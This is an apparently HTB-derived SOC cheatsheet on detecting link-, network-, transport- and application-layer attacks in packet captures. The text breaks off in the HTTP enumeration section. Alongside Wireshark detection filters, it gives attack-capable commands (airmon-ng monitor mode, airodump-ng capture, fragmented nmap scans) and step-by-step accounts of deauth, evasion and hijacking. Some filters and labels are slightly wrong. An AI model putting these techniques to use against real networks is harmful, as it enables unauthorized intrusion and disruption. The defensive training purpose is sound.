# 🛡️ INTERMEDIATE NETWORK TRAFFIC ANALYSIS

## SOC Analyst Cheatsheet - Module 8/15

---

## 0. Overview

> 📌 **Intermediate Network Traffic Analysis** - Advanced techniques for detecting network threats across all layers.

### Module Description

Through network traffic analysis, this module sharpens skills in detecting:
- **Link Layer:** ARP anomalies, rogue access points
- **Network Layer:** IP spoofing, TCP handshake irregularities
- **Application Layer:** Web vulnerabilities, peculiar DNS activities

### What We'll Cover

| Layer | Topics |
|-------|--------|
| **Link Layer** | ARP spoofing, ARP scanning, DoS, Rogue AP, Evil-Twin |
| **Network Layer** | Fragmentation attacks, IP spoofing, TTL attacks |
| **Transport Layer** | TCP handshake abnormalities, RST attacks, hijacking |
| **Application Layer** | HTTP enumeration, XSS, SSL renegotiation, DNS anomalies |

> 🔴 **Note:** Download pcap_files.zip from Resources section for hands-on exercises.

### PCAP Files

```bash
# Extract PCAP files from local Resources
unzip Resources/pcap_files.zip -d pcaps/
```

**PCAP Files List:**

| File | Description |
|------|-------------|
| ARP_Poison.pcapng | ARP Poisoning |
| ARP_Scan.pcapng | ARP Scanning |
| ARP_Spoof.pcapng | ARP Spoofing |
| basic_fuzzing.pcapng | Fuzzing Attacks |
| CRLF_and_host_header_manipulation.pcapng | HTTP Header Injection |
| deauthandbadauth.cap | WiFi Deauth + Bad Auth |
| decoy_scanning_nmap.pcapng | Nmap Decoy Scan |
| dns_enum_detection.pcapng | DNS Enumeration Detection |
| dns_tunneling.pcapng | DNS Tunneling |
| icmp_frag.pcapng | ICMP Fragmentation |
| ICMP_smurf.pcapng | Smurf Attack |
| icmp_tunneling.pcapng | ICMP Tunneling |
| ip_ttl.pcapng | IP TTL Manipulation |
| LAND-DoS.pcapng | LAND DoS Attack |
| nmap_*_scan.pcapng | Various Nmap Scans |
| rogueap.cap | Rogue Access Point |
| RST_Attack.pcapng | TCP RST Attack |
| TCP-hijacking.pcap | TCP Hijacking |
| telnet_tunneling_*.pcapng | Telnet Tunneling |
| XSS_Simple.pcapng | XSS Attack |

---

## Table of Contents

1. [Introduction](#1-introduction)
2. [Link Layer Attacks](#2-link-layer-attacks)
   - [ARP Spoofing & Abnormality Detection](#2-link-layer-attacks)
   - [ARP Scanning & Denial-of-Service](#arp-scanning--denial-of-service)
   - [802.11 Denial-of-Service](#80211-denial-of-service)
   - [Rogue Access Point & Evil-Twin](#rogue-access-point--evil-twin)
3. [Detecting Network Abnormalities](#3-detecting-network-abnormalities)
   - [Fragmentation Attacks](#fragmentation-attacks)
   - [IP Spoofing](#ip-spoofing)
   - [IP TTL Attacks](#ip-ttl-attacks)
   - [TCP Handshake Abnormalities](#tcp-handshake-abnormalities)
   - [TCP Connection Resets & Hijacking](#tcp-connection-resets--hijacking)
   - [ICMP Tunneling](#icmp-tunneling)
4. [Application Layer Attacks](#4-application-layer-attacks)
   - [HTTP/HTTPS Enumeration](#httphttps-enumeration)
   - [Strange HTTP Headers](#strange-http-headers)
   - [XSS & Code Injection](#xss--code-injection)
   - [SSL Renegotiation](#ssl-renegotiation)
   - [Peculiar DNS Traffic](#peculiar-dns-traffic)
   - [Strange Telnet & UDP](#strange-telnet--udp)
5. [Skills Assessment](#5-skills-assessment)
6. [Interview Questions](#interview-questions)
7. [Additional Resources](#additional-resources)

---

## 1. Introduction

*Content from Module 8 Section 1 - see Overview above*

---

## 2. Link Layer Attacks

### ARP Spoofing & Abnormality Detection

> 📌 **ARP Spoofing** - Attack that maps attacker's MAC address to a legitimate IP address to intercept traffic.

#### How ARP Works

<img width="873" height="718" alt="image" src="https://github.com/user-attachments/assets/f67039fe-0b0a-4c73-8bab-23a5a0a02563" />

**ARP Process:**
1. Host A needs to send data to Host B
2. Checks ARP cache for IP-to-MAC mapping
3. If not found, broadcasts ARP request: "Who has IP x.x.x.x?"
4. Host B replies with ARP response: "IP x.x.x.x = MAC aa:aa:aa:aa:aa:aa"
5. Host A updates ARP cache
6. Cache can update when hosts change IP/MAC

#### ARP Poisoning & Spoofing

<img width="860" height="668" alt="image" src="https://github.com/user-attachments/assets/01decf2b-4241-4aeb-9f06-0c6d7b41e42a" />

**Attack Steps:**
1. Attacker sends forged ARP messages to victim and router
2. Tells victim: "Gateway IP = Attacker's MAC"
3. Tells router: "Victim IP = Attacker's MAC"
4. Victim's ARP cache gets corrupted
5. Attacker becomes MITM
6. Can perform DNS spoofing, SSL stripping

**Prevention:**
- Static ARP entries (high maintenance)
- Switch/Router port security

#### Detecting ARP Spoofing

**Install tcpdump:**
```bash
sudo apt install tcpdump -y
```

**Capture traffic:**
```bash
sudo tcpdump -i eth0 -w filename.pcapng
```

**Open PCAP in Wireshark:**
```bash
wireshark ARP_Spoof.pcapng
```

**Filter ARP traffic:**
```
arp.opcode
```

<img width="1141" height="467" alt="image" src="https://github.com/user-attachments/assets/2f704340-5f4e-4dfc-9e7a-5ddd18dc9f28" />

Wireshark ARP requests and replies.

**ARP Opcodes:**
| Opcode | Description |
|--------|-------------|
| 1 | ARP Request |
| 2 | ARP Reply |

#### Detecting Duplicate IP

<img width="1229" height="180" alt="image" src="https://github.com/user-attachments/assets/9e6f4dc8-ea53-4b5e-80fc-56f17fe8af2d" />

**Filter for duplicate detection:**
```
arp.duplicate-address-detected && arp.opcode == 2
```

<img width="1046" height="182" alt="image" src="https://github.com/user-attachments/assets/de4208c2-7bf6-498d-afd8-480837dc125f" />

Wireshark showing duplicate IP detection.

**Check ARP cache on Linux:**
```bash
arp -a | grep 50:eb:f6:ec:0e:7f
arp -a | grep 08:00:27:53:0c:ba
```

> 🔴 **Red Flag:** Same IP mapped to two different MAC addresses!

#### Identifying Original IP Addresses

**Filter by MAC address:**
```
(arp.opcode) && ((eth.src == 08:00:27:53:0c:ba) || (eth.dst == 08:00:27:53:0c:ba))
```

<img width="1038" height="226" alt="image" src="https://github.com/user-attachments/assets/ba0b7223-cef5-41b8-9c63-fd6d0e64d5f1" />

**Analysis:**
- MAC 08:00:27:53:0c:ba was originally 192.168.10.5
- Changed to 192.168.10.4 - indicates ARP spoofing!

**Filter all traffic from suspicious MACs:**
```
eth.addr == 50:eb:f6:ec:0e:7f or eth.addr == 08:00:27:53:0c:ba
```

<img width="1246" height="142" alt="image" src="https://github.com/user-attachments/assets/81d6d8a1-c3d4-4c10-83a4-4367d90afdad" />

TCP + ARP packets showing suspicious activity.

#### MITM Detection

> 🔴 If traffic is forwarded (MITM), you'll see:
- Identical/near-symmetrical packets: victim → attacker → router
- TCP connections dropping if attacker doesn't forward

---

### ARP Scanning & Denial-of-Service

> 📌 Attackers use ARP scanning for information gathering before DoS/MITM attacks.

#### ARP Scanning Signs

**Red Flags:**
- Broadcast ARP requests sent to sequential IP addresses (.1, .2, .3...)
- Broadcast ARP requests sent to non-existent hosts
- Unusual volume of ARP traffic from single host

#### Finding ARP Scanning

**Open PCAP:**
```bash
wireshark ARP_Scan.pcapng
```

**Filter ARP:**
```
arp.opcode
```

<img width="927" height="345" alt="image" src="https://github.com/user-attachments/assets/77d736c3-7290-4b89-b12e-c01b2b08c0bc" />

> 🔴 **Detection:** Single host sending ARP requests to sequential IP addresses = ARP scanning (like Nmap)

#### Identifying Denial-of-Service

**Related PCAP:** ARP_Poison.pcapng

**Attack Pattern:**
1. Attacker compiles list of live hosts via ARP scanning
2. Shifts to DoS by contaminating entire subnet
3. Manipulates as many ARP caches as possible

<img width="1206" height="463" alt="image" src="https://github.com/user-attachments/assets/dfc8c97f-507f-4f0f-858c-e623f3936df3" />

**Attack Indicators:**
- ARP traffic declaring new physical addresses for all live IPs
- Intent: Corrupt router's ARP cache
- Duplicate allocation of gateway IP to client devices

<img width="1042" height="256" alt="image" src="https://github.com/user-attachments/assets/574ea528-b510-4fb1-a30c-a10dcfa646b7" />

**Red Flags:**
- Duplicate IP 192.168.10.1 assigned to multiple MACs
- Attacker attempting to corrupt victim ARP caches
- Intent: Obstruct traffic in both directions

#### Responding To ARP Attacks

**Response Options:**

| Action | Description |
|--------|-------------|
| **Tracing & Identification** | Locate attacker's physical machine. May find it's already compromised. |
| **Containment** | Disconnect/isolate affected segment at switch/router level to stop DoS/MITM |

> 💡 **Note:** Link layer attacks often fly under the radar but detection is crucial for preventing data exfiltration from higher OSI layers.

---

### 802.11 Denial-of-Service

> 📌 Wi-Fi link-layer attacks that can lead to perimeter compromise.

#### Capturing 802.11 Traffic

**Requirements:**
- WIDS/WIPS system OR
- Wireless interface with monitor mode

**List wireless interfaces:**
```bash
iwconfig
```

**Set monitor mode (Airmon-NG):**
```bash
sudo airmon-ng start wlan0
```

**Set monitor mode (manual):**
```bash
sudo ifconfig wlan0 down
sudo iwconfig wlan0 mode monitor
sudo ifconfig wlan0 up
```

**Verify monitor mode:**
```bash
iwconfig
# Should show Mode:Monitor
```

**Capture traffic:**
```bash
sudo airodump-ng -c 4 --bssid F8:14:FE:4D:E6:F1 wlan0 -w raw
```

#### How Deauthentication Attacks Work

**Attack Purposes:**
- Capture WPA handshake for offline dictionary attack
- Cause general DoS
- Force users to join attacker's network (Evil Twin)

**Attack Method:**
1. Attacker spoofs 802.11 deauthentication frame
2. Pretends to come from legitimate AP
3. Client disconnects and reconnects
4. Attacker sniffs during handshake

<img width="647" height="470" alt="image" src="https://github.com/user-attachments/assets/8132377c-5c59-4204-a985-168f315c6052" />

> 🔴 Attack spoofs MAC - client can't distinguish without 802.11w (Management Frame Protection)

**Common reason code:** 7 (used by aireplay-ng, mdk4)

#### Finding Deauthentication Attacks

**Open PCAP:**
```bash
sudo wireshark deauthandbadauth.cap
```

**Filter by BSSID:**
```
wlan.bssid == xx:xx:xx:xx:xx:xx
```

<img width="1172" height="464" alt="image" src="https://github.com/user-attachments/assets/2424d49c-5d41-4276-bc95-eb43fa1bf3a1" />

Wireshark showing probe responses from AP.

**Filter deauth frames:**
```
(wlan.bssid == xx:xx:xx:xx:xx:xx) and (wlan.fc.type == 00) and (wlan.fc.type_subtype == 12)
```

- `wlan.fc.type == 00` = Management frame
- `wlan.fc.type_subtype == 12` = Deauthentication

<img width="1089" height="430" alt="image" src="https://github.com/user-attachments/assets/11bf462a-a945-437a-82fa-1aeec88370c3" />

**Filter with Reason Code 7:**
```
(wlan.bssid == F8:14:FE:4D:E6:F1) and (wlan.fc.type == 00) and (wlan.fc.type_subtype == 12) and (wlan.fixed.reason_code == 7)
```

<img width="1037" height="113" alt="image" src="https://github.com/user-attachments/assets/93e326f5-cd00-4139-92ab-cf4b8169317b" />

Reason code: Class 3 frame received from nonassociated STA (0x0007)

<img width="971" height="465" alt="image" src="https://github.com/user-attachments/assets/774653da-06c6-402d-90a9-f6150f7c2147" />

> 🔴 **Red Flag:** Excessive deauth frames to one client + reason code 7

#### Revolving Reason Codes

Sophisticated attackers evade detection by changing reason codes.

**Detection method:** Increment through reason codes

```
# Reason code 1
(wlan.bssid == F8:14:FE:4D:E6:F1) and (wlan.fc.type == 00) and (wlan.fc.type_subtype == 12) and (wlan.fixed.reason_code == 1)
```

<img width="961" height="465" alt="image" src="https://github.com/user-attachments/assets/e18c48eb-de60-4d37-9aff-015f72ab5ab2" />

**Reason code 1:**
```
(wlan.bssid == F8:14:FE:4D:E6:F1) and (wlan.fc.type == 00) and (wlan.fc.type_subtype == 12) and (wlan.fixed.reason_code == 2)
```

<img width="941" height="466" alt="image" src="https://github.com/user-attachments/assets/d137b8a4-47c9-4ddc-8759-c9e6d8643263" />

**Reason code 3:**
```
(wlan.bssid == F8:14:FE:4D:E6:F1) and (wlan.fc.type == 00) and (wlan.fc.type_subtype == 12) and (wlan.fixed.reason_code == 3)
```

<img width="988" height="464" alt="image" src="https://github.com/user-attachments/assets/40e9b803-72fb-4c59-8884-82f3c753f671" />

#### Prevention

| Measure | Description |
|---------|-------------|
| **Enable IEEE 802.11w** | Management Frame Protection |
| **Use WPA3-SAE** | Stronger authentication |
| **Modify WIDS/WIPS rules** | Detect unusual reason codes |

#### Finding Failed Authentication

**Filter auth/association attempts:**
```
(wlan.bssid == F8:14:FE:4D:E6:F1) and (wlan.fc.type == 00) and (wlan.fc.type_subtype == 0) or (wlan.fc.type_subtype == 1) or (wlan.fc.type_subtype == 11)
```

<img width="977" height="467" alt="image" src="https://github.com/user-attachments/assets/1494cc22-5180-410c-8937-8c693089ef97" />

Authentication and association response frames.

> 💡 **Note:** Distinguishing legitimate vs attacker traffic is crucial for perimeter security.

---

### Rogue Access Point & Evil-Twin

> 📌 **Rogue AP** - Unauthorized access point connected to network
> 📌 **Evil-Twin** - Standalone fake AP for harvesting credentials

#### Overview

<img width="588" height="354" alt="image" src="https://github.com/user-attachments/assets/5aef5080-951c-489f-a62d-c633a03306cb" />

**Rogue Access Point:**
- Directly connected to legitimate network
- Bypasses segmentation controls
- Used to sidestep perimeter security
- Can infiltrate air-gapped networks

**Evil-Twin:**

<img width="710" height="464" alt="image" src="https://github.com/user-attachments/assets/f4e5eb69-12d0-451f-984f-e184c4a29bcc" />

- Not connected to network
- Standalone access point
- Often mimics legitimate AP SSID
- Used for:
  - Harvesting wireless/domain passwords
  - Hostile portal attacks
  - Man-in-the-middle

#### Airodump-ng Detection

**Detect by ESSID:**
```bash
sudo airodump-ng -c 4 --essid HTB-Wireless wlan0 -w raw
```

**Output:**
```
BSSID              PWR  ENC  ESSID
F8:14:FE:4D:E6:F2  -7   OPN  HTB-Wireless   # Attacker's open AP
F8:14:FE:4D:E6:F1  -5   WPA2 HTB-Wireless   # Legitimate AP
```

> 🔴 **Red Flag:** Open AP with same ESSID = potential Evil-Twin!

#### Finding Evil-Twin in PCAP

**Open PCAP:**
```bash
wireshark rogueap.cap
```

**Filter beacon frames:**
```
(wlan.fc.type == 00) and (wlan.fc.type_subtype == 8)
```

<img width="1138" height="125" alt="image" src="https://github.com/user-attachments/assets/48e0fc06-e346-4a9e-8c4d-6d64cbcc831f" />

Beacon frames from both legitimate and fake AP.

#### RSN Analysis

**Legitimate AP (WPA2):**

<img width="731" height="425" alt="image" src="https://github.com/user-attachments/assets/6defca5c-21e9-4e45-98af-6070e4047bb4" />

- Supports AES and TKIP
- PSK authentication
- RSN Information present

**Evil-Twin (Open):**

<img width="622" height="211" alt="image" src="https://github.com/user-attachments/assets/f3225688-3edb-4b0b-8b80-8771a947aac6" />

- RSN Information **MISSING**
- No encryption

> 🔴 **Detection:** Missing RSN = typical Evil-Twin indicator!

#### Finding Compromised User

**Filter by suspicious BSSID:**
```
(wlan.bssid == F8:14:FE:4D:E6:F2)
```

<img width="1157" height="224" alt="image" src="https://github.com/user-attachments/assets/3ed975f8-8e94-4364-bd9e-9d6118b2f7ef" />

**Detection:**
- Look for ARP requests from client device
- If client connected to suspicious network = compromise indicator

**Record for Incident Response:**
- Client MAC address
- Client hostname
- Password resets needed

#### Finding Rogue Access Points

**Detection Methods:**
- Check network device lists
- Look for unknown wireless networks with strong signal
- Unencrypted networks near perimeter = potential rogue

---

## 3. Detecting Network Abnormalities

### Fragmentation Attacks

> 📌 IP fragmentation attacks exploit how large packets are split and reassembled.

#### IP Header Fields

<img width="337" height="183" alt="image" src="https://github.com/user-attachments/assets/77288a24-5f08-4557-a5e2-765cd6701599" />

**Key Fields:**
| Field | Description |
|-------|-------------|
| Length | IP header length |
| Total Length | Entire IP packet length |
| Fragment Offset | Instructions to reassemble packets |
| Source/Dest IP | Origination and destination addresses |

#### Commonly Abused Fields

Attackers craft packets to cause communication issues and evade controls.

#### Abuse of Fragmentation

**Legitimate Use:** Split large packets using MTU (Maximum Transmission Unit) to accommodate transmission.

**Attack Purposes:**

| Attack Type | Description |
|-------------|-------------|
| **IPS/IDS Evasion** | Split attack packets to bypass IDS that doesn't reassemble |
| **Firewall Evasion** | Fragment to bypass firewall rules |
| **Resource Exhaustion** | Very small MTU (10-15-20) exhausts reassembly resources |
| **Denial of Service** | Send packets >65535 bytes to crash old hosts |

**Proper Network Behavior:**
- IDS/IPS/Firewall should reassemble fragments before inspection
- Delayed reassembly to match destination host behavior

#### Finding Fragmentation Attacks

**Open PCAP:**
```bash
wireshark nmap_frag_fw_bypass.pcapng
```

**Normal Nmap:**
```bash
nmap <host ip>
```

<img width="1134" height="495" alt="image" src="https://github.com/user-attachments/assets/634f8f8e-9066-4e7b-9d88-cbe3a3859094" />

ICMP ping requests - beginning of host discovery.

**Fragmented Nmap:**
```bash
nmap -f 10 <host ip>
```

<img width="1139" height="190" alt="image" src="https://github.com/user-attachments/assets/f87c4426-c0c7-4671-b5ab-061f60f76fa1" />

Packets with max size 10 = fragmentation attack indicator.

**Key Indicator:**

<img width="1143" height="360" alt="image" src="https://github.com/user-attachments/assets/2ee519cf-5bad-42cb-8ffd-4e98c166b1a1" />

> 🔴 **Red Flag:** Single host sending to many ports with fragmentation = fragmented scan!

**Detection:** Destination responds with RST for closed ports.

#### Wireshark Reassembly

**Enable reassembly:**
```
Edit → Preferences → Protocols → IPv4 → Reassemble fragmented datagrams
```

<img width="693" height="507" alt="image" src="https://github.com/user-attachments/assets/7462af0e-1686-4c1d-999e-5d3570b13249" />

---

### IP Spoofing

> 📌 **IP Spoofing** - Attack where attacker forges source/destination IP addresses to evade controls or launch attacks.

#### How IP Spoofing Works

IP spoofing involves modifying the source IP address in packet headers to:
- Hide attacker's identity
- Bypass firewall/IDS controls
- Impersonate trusted hosts
- Launch denial-of-service attacks

#### Key Indicators

| Indicator | Description |
|-----------|-------------|
| **Incoming traffic** | Source IP from outside subnet = suspicious |
| **Outgoing traffic** | Source IP not from local subnet = malicious |

#### Types of IP Spoofing Attacks

**1. Decoy Scanning**
- Attacker changes source IP to enumerate target network
- Bypasses firewall by appearing as internal host
- **Indicator:** Mixed fragmentation from fake + legitimate IPs

**2. Random Source Attack (DDoS)**
- Attacker sends traffic with randomized source IPs
- Targets same port on victim to exhaust resources
- **Indicator:** Many random IPs hitting single port

**3. LAND Attacks**
- Source IP = Destination IP (same host)
- Creates infinite loop, exhausts resources
- Causes crashes on target host
- **Indicator:** SYN packets where src = dst IP

**4. SMURF Attacks**
- Attacker sends ICMP to broadcast with spoofed victim IP
- All hosts respond to victim, causing DoS
- **Indicator:** Excessive ICMP replies to single host

**5. Initialization Vector Generation (WEP)**
- Old wireless attack
- Craft packets to generate IVs for decryption
- **Indicator:** Excessive repeated packets between hosts

#### Finding Decoy Scanning

**Open PCAP:**
```bash
wireshark decoy_scanning_nmap.pcapng
```

**Detection Indicators:**
- Initial fragmentation from fake address
- Some TCP traffic from legitimate source address

<img width="1144" height="445" alt="image" src="https://github.com/user-attachments/assets/11a9be47-d45a-40fd-b035-c49607ec325c" />

- Responses with RST flags directed to attacker

<img width="1142" height="374" alt="image" src="https://github.com/user-attachments/assets/57ab07b5-17eb-4eae-a663-c50c47afa7f8" />

TCP traffic with RST packets.

<img width="1137" height="172" alt="image" src="https://github.com/user-attachments/assets/938c682d-28dc-44b8-8516-bb6150b97687" />

**Prevention:**
- IDS/IPS reconstructs packets to detect malicious activity
- Watch for connections taken over by another host

#### Finding Random Source Attacks

**PCAP Files:**
- ICMP_rand_source.pcapng
- ICMP_rand_source_larg_data.pcapng
- TCP_rand_source_attacks.pcapng

**Detection:**

<img width="990" height="239" alt="image" src="https://github.com/user-attachments/assets/9ec034e9-8197-4c78-85b4-d6fc37b13928" />

ICMP echo replies to many random destinations.

**Fragmented random hosts:**

<img width="1179" height="361" alt="image" src="https://github.com/user-attachments/assets/8caf369d-47a0-45fd-896f-410f4a6a770b" />

Fragmented ICMP traffic.

**LAND Attack Indicator:**

<img width="872" height="310" alt="image" src="https://github.com/user-attachments/assets/e8a1d875-cb33-44cb-b1dd-9ac59eb1de8b" />

- Single port (e.g., 80) from random hosts
- Incremental base port without randomization
- Identical length fields

**Detection:**
- Many different hosts pinging single host
- Represents SMURF attack

<img width="1107" height="462" alt="image" src="https://github.com/user-attachments/assets/2fc4dd59-d924-41a9-8af7-47f3e90afdc9" />

ICMP echo requests/replies - SMURF attack pattern.

#### Finding LAND Attacks

**PCAP:** LAND-DoS.pcapng

**How LAND Works:**
- Source IP = Destination IP (same host)
- Sends SYN to same host's port 80
- Creates infinite loop
- Exhausts all base ports

<img width="875" height="328" alt="image" src="https://github.com/user-attachments/assets/45d0b440-4c6f-4b8a-ac2c-a26c26ca4bae" />

TCP SYN from 192.168.10.1 to 192.168.10.1 port 80 = LAND attack!

**How SMURF Works:**
1. Attacker sends ICMP request to broadcast with spoofed victim IP
2. All live hosts respond to victim
3. Victim experiences resource exhaustion

**Detection:**
- Excessive ICMP replies from single host to victim
- May include fragmentation for larger traffic volume

<img width="1171" height="360" alt="image" src="https://github.com/user-attachments/assets/d254aa29-b077-4b8c-9642-336c62c9191e" />

---

### IP TTL Attacks

> 📌 **TTL Attacks** - Attacker sets low TTL to evade firewalls/IDS/IPS by causing packets to expire before reaching security controls.

#### How TTL Attacks Work

<img width="700" height="365" alt="image" src="https://github.com/user-attachments/assets/013c562f-699e-4765-87a3-617f8a3e6585" />

**Attack Process:**
1. Attacker crafts packet with intentionally low TTL (1, 2, 3...)
2. Each router decrements TTL by 1
3. When TTL reaches 0, packet is discarded
4. Packet expires BEFORE reaching firewall/IDS
5. Router sends ICMP "Time Exceeded" back to source

**Purpose:** Evade security controls that only inspect packets reaching destination

#### Finding TTL Irregularities

**Open PCAP:**
```bash
wireshark ip_ttl.pcapng
```

**Detection:**

<img width="872" height="258" alt="image" src="https://github.com/user-attachments/assets/65599273-c2bb-46b7-b40d-8a7577c0f091" />

TCP SYN packets to target port 80.

**Evasion Success Indicator:**

<img width="1027" height="460" alt="image" src="https://github.com/user-attachments/assets/2b5962aa-1739-45fe-ab09-4bb3fd16600a" />

If attacker receives SYN-ACK response = **firewall successfully evaded!**

**Check TTL in Packet:**

<img width="500" height="255" alt="image" src="https://github.com/user-attachments/assets/664bd308-a780-4858-bf3c-473d8712b155" />

Open packet → IPv4 tab → Look for **very low TTL** (e.g., TTL = 3)

#### Prevention

- Filter or discard packets with TTL below threshold
- Ensure security controls reassemble and inspect before expiration

---

### TCP Handshake Abnormalities

> 📌 **TCP Handshake Attacks** - Attackers exploit TCP flags to scan ports and evade detection.

#### Normal TCP 3-Way Handshake

<img width="368" height="178" alt="image" src="https://github.com/user-attachments/assets/f9d99c23-6387-4a0d-aafc-5ecd4d2258ea" />

1. Client sends **SYN**
2. Server responds **SYN-ACK**
3. Client sends **ACK** → Connection established

#### TCP Flags

| Flag | Description |
|------|-------------|
| **URG** | Urgent data in stream |
| **ACK** | Acknowledges receipt |
| **PSH** | Push to application immediately |
| **RST** | Reset/terminate connection |
| **SYN** | Establish initial connection |
| **FIN** | Finish/close connection |
| **ECN** | Explicit Congestion Notification |

#### Strange Conditions to Watch

| Indicator | Description |
|-----------|-------------|
| **Too many flags** | Scanning occurring |
| **Unusual flags** | RST attack, hijacking, evasion |
| **One host to many ports/hosts** | Port scanning |

---

### Excessive SYN Flags

**Related PCAP:** nmap_syn_scan.pcapng

**How it works:**
- Attacker sends TCP SYN packets to target ports
- Open port → responds SYN-ACK → attacker sends RST
- Closed port → responds RST

<img width="976" height="362" alt="image" src="https://github.com/user-attachments/assets/216b73b0-6b67-4640-8828-57aa091b84a5" />

**SYN Scan Types:**
| Scan | Description |
|------|-------------|
| **SYN Scan** | Completes handshake, ends with RST |
| **SYN Stealth** | Partially completes to evade detection |

---

### No Flags (NULL Scan)

**Related PCAP:** nmap_null_scan.pcapng

**How NULL scan works:**
| Port State | Response |
|-----------|----------|
| **Open** | No response |
| **Closed** | RST packet |

<img width="935" height="410" alt="image" src="https://github.com/user-attachments/assets/1dd2444b-c589-4427-8e96-6d5844183581" />

---

### Too Many ACKs (ACK Scan)

**Related PCAP:** nmap_ack_scan.pcapng

**How ACK scan works:**
| Port State | Response |
|-----------|----------|
| **Open** | No response or RST |
| **Closed** | RST packet |

<img width="948" height="375" alt="image" src="https://github.com/user-attachments/assets/ce217647-34d0-485a-99a3-838444d7297a" />

---

### Excessive FINs (FIN Scan)

**Related PCAP:** nmap_fin_scan.pcapng

**How FIN scan works:**
| Port State | Response |
|-----------|----------|
| **Open** | No response |
| **Closed** | RST packet |

<img width="960" height="393" alt="image" src="https://github.com/user-attachments/assets/961ca0c7-dee8-4f7f-bd68-d2f284a4e923" />

---

### All Flags (XMAS Tree Scan)

**Related PCAP:** nmap_xmas_scan.pcapng

**How XMAS scan works:**
- Sets ALL TCP flags (FIN, PSH, URG)
- Hard to detect but easy to spot

| Port State | Response |
|-----------|----------|
| **Open** | No response or RST |
| **Closed** | RST packet |

<img width="1019" height="376" alt="image" src="https://github.com/user-attachments/assets/5a80f8ac-ff1f-49c3-a5bb-7fc6e7930186" />

---

### TCP Connection Resets & Hijacking

> 📌 **TCP RST Attack** - Forges RST packets to terminate connections
> 📌 **TCP Hijacking** - Takes over existing connection through sequence prediction

#### TCP Connection Termination (RST Attack)

**Related PCAP:** RST_Attack.pcapng

**How RST Attack Works:**

1. Attacker spoofs source IP to match victim's IP
2. Crafts TCP packet with **RST flag** set
3. Specifies same destination port as victim connection
4. Sends to target → Connection terminated!

**Detection:**

<img width="875" height="344" alt="image" src="https://github.com/user-attachments/assets/38ce1637-3d1f-4e7a-bd6f-a0c2276029f7" />

Excessive RST packets to single port.

**Verify Attack:**
- Check MAC address of RST sender
- If MAC doesn't match registered IP owner = attack!

<img width="1031" height="89" alt="image" src="https://github.com/user-attachments/assets/8c967e20-7a3a-4756-a41d-c61652024b0e" />

**Indicator:** Different MAC sending packets for same IP

> 🔴 Attacker may also spoof MAC - watch for retransmissions (like ARP poisoning)

---

#### TCP Connection Hijacking

**Related PCAP:** TCP-hijacking.pcap

**How TCP Hijacking Works:**

1. Attacker monitors target connection
2. Conducts **sequence number prediction**
3. Injects malicious packets in correct sequence
4. Spoofs source IP to match victim's IP
5. Blocks/delays ACKs from reaching victim
6. Takes over the connection!

> 🔴 **Commonly paired with ARP poisoning** to block ACK packets

**Detection:**

<img width="300" height="50" alt="image" src="https://github.com/user-attachments/assets/28549b33-79a0-45eb-8225-4295c321bdb8" />

TCP retransmission packets with PSH, ACK flags (port 23 = Telnet)

**Indicators:**
- Unusual TCP retransmissions
- Sequence number anomalies
- Connection continues when should have ended

---

### ICMP Tunneling

> 📌 **ICMP Tunneling** - Encodes data in ICMP packets to bypass firewalls and exfiltrate data.

#### Basics of Tunneling

**What is Tunneling?**
- Technique to exfiltrate data through allowed protocols
- Bypasses network controls/firewalls
- Uses protocols like SSH, HTTP, HTTPS, DNS, ICMP

**Common Types:**
- SSH Tunneling
- HTTP/HTTPS Tunneling
- DNS Tunneling
- **ICMP Tunneling**

<img width="900" height="375" alt="image" src="https://github.com/user-attachments/assets/440bd0b5-1019-47ca-9882-1382a9ebc5a7" />

SSH tunnel example.

---

#### ICMP Tunneling

**How ICMP Tunneling Works:**

1. Attacker appends data to ICMP request data field
2. Data is hidden within common ICMP protocol
3. Passes through firewall undetected
4. Data reaches external server

<img width="876" height="403" alt="image" src="https://github.com/user-attachments/assets/b69923b0-025f-4b87-9c45-fc69a38007ec" />

---

#### Finding ICMP Tunneling

**Open PCAP:**
```bash
wireshark icmp_tunneling.pcapng
```

**Filter ICMP:**
```
icmp
```

<img width="1088" height="276" alt="image" src="https://github.com/user-attachments/assets/3594b314-5c66-475c-9d8a-aca5feac3d14" />

ICMP echo requests.

**Detection - Fragmentation:**

<img width="1167" height="359" alt="image" src="https://github.com/user-attachments/assets/8f2e0b02-6a3f-4711-a459-18d7abc4dcdb" />

Large ICMP data = fragmentation.

Normal ICMP: ~48 bytes

<img width="658" height="262" alt="image" src="https://github.com/user-attachments/assets/2a2e1ed8-2fbb-4639-8185-706eeb2cecef" />

Suspicious ICMP: ~38000 bytes!

<img width="650" height="234" alt="image" src="https://github.com/user-attachments/assets/578431e5-03c4-440e-8179-5ca8f1e43ceb" />

> 🔴 **Red Flag:** ICMP data > 48 bytes = possible tunneling!

**Finding Data in ICMP:**

<img width="534" height="557" alt="image" src="https://github.com/user-attachments/assets/fc5395f5-f6eb-4621-be62-21baed4995d3" />

Look for credentials in hex dump (e.g., Username: root; Password: ...)

**Encoded Data:**

<img width="553" height="561" alt="image" src="https://github.com/user-attachments/assets/adc4b3b6-c277-42b0-a82f-d40dfb18eb62" />

Base64 encoded exfiltrated data.

**Decode:**
```bash
echo 'VGhpcyBpcyBhIHNlY3VyZSBrZXk6IEtleTEyMzQ1Njc4OQo=' | base64 -d
# Output: This is a secure key: Key12345678
```

---

#### Prevention

| Method | Description |
|--------|-------------|
| **Block ICMP** | If not needed, block entirely |
| **Inspect ICMP Data** | Check for malicious content |
| **Limit Data Size** | Reject ICMP > 64 bytes |

> 💡 If ICMP data length > 48 bytes → investigate!

---

## 4. Application Layer Attacks

### HTTP/HTTPS Enumeration

> 📌 **HTTP/HTTPS Enumeration** - Attackers fuzz web servers to discover hidden pages, vulnerabilities, and gather intelligence before launching attacks.

#### What is HTTP/HTTPS Enumeration?

Web servers are common targets for attackers. Before launching an attack, adversaries often perform **fuzzing** - sending numerous requests to discover:
- Hidden directories and files
- Vulnerable endpoints
- Parameter injection points
- IDOR (Insecure Direct Object Reference) vulnerabilities

#### Types of Fuzzing Attacks

| Type | Description | Detection Signs |
|------|-------------|-----------------|
| **Directory Fuzzing** | Attempting to access hidden files/directories | Multiple 404 responses in rapid succession |
| **Parameter Fuzzing** | Testing different parameter values | Repeated requests with changing IDs |
| **Value Fuzzing** | Changing return values (e.g., return=max→min) | Unusual parameter patterns |

#### Related PCAP

- `basic_fuzzing.pcapng`

#### Detecting Directory Fuzzing

**Wireshark Filter:** Show all HTTP traffic
```
http
```

![HTTP Traffic Overview](https://github.com/user-attachments/assets/ba50d64c-0dbc-4e76-b7dd-b29a80674c63)

